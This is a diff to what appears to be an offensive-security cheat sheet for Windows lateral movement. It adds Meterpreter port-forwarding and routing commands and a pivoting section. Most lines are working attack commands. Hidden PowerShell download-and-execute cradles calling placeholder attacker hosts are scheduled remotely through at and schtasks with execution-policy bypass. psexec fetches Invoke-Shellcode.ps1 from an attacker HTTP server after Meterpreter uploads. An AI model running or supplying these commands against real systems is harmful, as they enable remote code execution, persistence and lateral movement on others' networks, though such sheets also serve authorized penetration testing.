@@ -20,16 +20,32 @@ wdigest
 
 ----------------------------------------
 
+----------------------------------------
 #check if admin access
 dir \\[HOST]\C$
 #check the time on remote server
 net time \\[HOST]
 #schedule a job to run, note at is deprecated in win8+
+
+----------------------------------------
+#Meterpreter Portfwd/route add
+#reference: https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/
+portfwd add –l 3389 –p 3389 –r target-host
+portfwd delete –l 3389 –p 3389 –r target-host
+portfwd flush
+portfwd list
+
+#routes
+run autoroute -s 192.168.15.0/24
+route add 192.168.14.0 255.255.255.0 3  # that tailing 3 is the session to use
+route delete 192.168.14.0 255.255.255.0 3
+route flush
 #Example COMMAND = powershell.exe -NoP -NonI -w HIDDEN -c IEX ((New-Object Net.WebClient).DownloadString('http://[ATTACK_IP]/b'))
 at \\[HOST] [H:MMPM] [COMMAND]
 #eg at \\[TARGET] 8:55PM "powershell.exe -NoP -NonI -w HIDDEN -c IEX ((New-Object Net.WebClient).DownloadString('http://[ATTACK_IP]/b'))"
 #Note: The AT command has been deprecated. Please use schtasks.exe instead.
 
+----------------------------------------
 # schtasks
 #32 bit POWERSHELL_PATH = C:\windows\System32\WindowsPowerShell\v1.0
 #64 bit POWERSHELL_PATH = C:\Windows\syswow64\WindowsPowerShell\v1.0
@@ -38,3 +54,21 @@ at \\[HOST] [H:MMPM] [COMMAND]
 #SC_OPTION = onidle /i 30  (30 minutes after idle)
 #SC_OPTION = once /st [HH:MM:SS 24-hour format] /sd [MM/DD/YYYY] /RU System
 schtasks /CREATE /TN [TASK_NAME] /TR "[POWERSHELL_PATH]\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://[ATTACKER_ADDR]/[SCRIPT]'''))'" /SC [SC_OPTION] /S [TARGET_HOST]
+
+-------------For pivoting when you have a incognito session --------------------
+----------------with an elevated account and want to move to -------------------
+-----------------another machine with the account in a -------------------
+-----------------whitelisting environment---------------------------
+#there should be a copy of pstools in /opt/pstools
+#on the Attack Machine
+cd /opt/local/malwaredefense
+python -m SimpleHTTPServer 80
+#in meterpreter
+upload /opt/pstools/psexec.exe c:\
+shell
+#you'll now be in a windows shell
+dir \\[ServerName]\C$  #Confirm access to the remote server
+psexec /accepteula \\[TARGET_IP] powershell.exe -NoP -NonI -w HIDDEN -c IEX ((New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]/Invoke-Shellcode.ps1'))
+
+-----------------------------------------
+#Local Users accounts and psexec reference: http://www.brandonmartinez.com/2013/04/24/resolve-access-is-denied-using-psexec-with-a-local-admin-account/
